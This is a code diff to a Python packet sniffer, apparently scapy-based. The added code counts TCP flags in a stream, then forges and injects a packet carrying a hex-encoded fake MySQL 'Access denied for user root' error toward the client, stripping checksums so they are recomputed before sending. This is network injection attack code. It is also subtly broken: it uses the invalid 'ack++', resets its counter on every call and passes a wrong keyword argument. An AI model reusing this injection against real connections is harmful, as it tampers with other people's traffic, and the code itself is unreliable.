@@ -29,9 +29,25 @@ current_response = None
 
 class sniffer:
     def sniff(pkt):
-        global sniff_settings, inject_packet, current_response
-        if pkt[IP].dst == sniff_settings.dst or pkt[IP].src == sniff_settings.src:
-            print_pkt(pkt)
+        global sniff_settings
+        ack = 0
+        psh = False
+        if pkt[TCP].flags == "A":
+            ack++
+        if pkt[TCP].flags == "PA" and ack == 2:
+            psh = True
+        if pkt[TCP].flags == "A" and ack == 3 and psh == True and pkt[IP].src == sniff_settings.dst:
+            # send payload (reponse error) to client
+            inject_packet = pkt
+            inject_packet.flags = "PA"
+            inject_packet.load ="48000002ff15042332383030304163636573732064656e69656420666f7220757365722027726f6f742740273137322e31382e302e"+hex(ord(pkt[IP].dst.split(".")[3]))+"2720287573696e672070617373776f72643a204e4f29"
+            del inject_packet.len
+            del inject_packet.options
+            del inject_packet.chksum
+            del inject_packet[TCP].chksum
+            sendp(inject_packet, Verbose=True)
+            inject_packet.show()
+            # send request query to server
 
     def __init__(self):
         global sniff_settings
